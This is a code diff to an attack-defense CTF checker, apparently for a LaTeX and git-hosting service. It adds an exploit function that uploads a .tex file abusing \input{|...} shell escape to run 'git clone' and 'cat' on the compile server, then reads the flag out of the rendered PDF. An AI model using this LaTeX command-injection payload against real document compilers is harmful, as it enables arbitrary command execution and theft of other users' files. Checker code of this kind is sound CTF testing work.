@@ -5,7 +5,7 @@ from typing import Optional, Tuple
 from logging import LoggerAdapter
 import hashlib
 
-from enochecker3 import Enochecker, PutflagCheckerTaskMessage, GetflagCheckerTaskMessage, HavocCheckerTaskMessage, ExploitCheckerTaskMessage, PutnoiseCheckerTaskMessage, GetnoiseCheckerTaskMessage, ChainDB, MumbleException
+from enochecker3 import Enochecker, PutflagCheckerTaskMessage, GetflagCheckerTaskMessage, HavocCheckerTaskMessage, ExploitCheckerTaskMessage, PutnoiseCheckerTaskMessage, GetnoiseCheckerTaskMessage, ChainDB, MumbleException, FlagSearcher
 from enochecker3.utils import assert_equals, assert_in
 from httpx import AsyncClient, Response, RequestError
 
@@ -210,6 +210,9 @@ async def putflag_zero(task: PutflagCheckerTaskMessage, client: AsyncClient, db:
 
     await upload_file(client, id, "main.tex", task.flag, logger)
 
+    await commit(client, id, "Minor changes to the layout", logger)
+    await push(client, id, logger)
+
     return id
 
 
@@ -347,6 +350,39 @@ async def exploit_zero(task: ExploitCheckerTaskMessage, client: AsyncClient, log
 
     # get flag
     return await download_file(client, id, "link", logger)
+
+@checker.exploit(1)
+async def exploit_one(task: ExploitCheckerTaskMessage, client: AsyncClient, searcher: FlagSearcher, logger: LoggerAdapter) -> str:
+    (username, password, _, id) = await create_user_and_project(client, None, logger)
+
+    f_id = task.attack_info
+
+    commands = f"git clone http://nginx-git/{f_id}; cat ./{f_id}/main.tex"
+
+    file_content = """\\documentclass[12pt]{scrartcl}
+\\usepackage{verbatim}
+\\begin{document}
+    \\input{|"echo XGJlZ2lue3ZlcmJhdGltfQ== | base64 --decode;""" + commands + """; echo XGVuZHt2ZXJiYXRpbX0= | base64 --decode"}
+\\end{document}
+"""
+    await upload_file(client, id, "main.tex", file_content, logger)
+    await compile(client, id, "main.tex", logger)
+    pdf_bytes = await download_pdf(client, id, logger)
+
+    file = f"/tmp/{id}.pdf"
+    with open(file, "wb") as f:
+        f.write(pdf_bytes)
+
+    os_succ(os.system(f"pdftotext {file} {file}.txt"))
+    
+    with open(f"{file}.txt", "r") as f:
+        output = f.read()
+
+    os.remove(f"{file}.txt")
+    os.remove(file)
+    
+    if flag := searcher.search_flag(output):
+        return flag
 
 @checker.putnoise(0)
 async def putnoise_file_content(task: PutnoiseCheckerTaskMessage, client: AsyncClient, db: ChainDB, logger: LoggerAdapter):
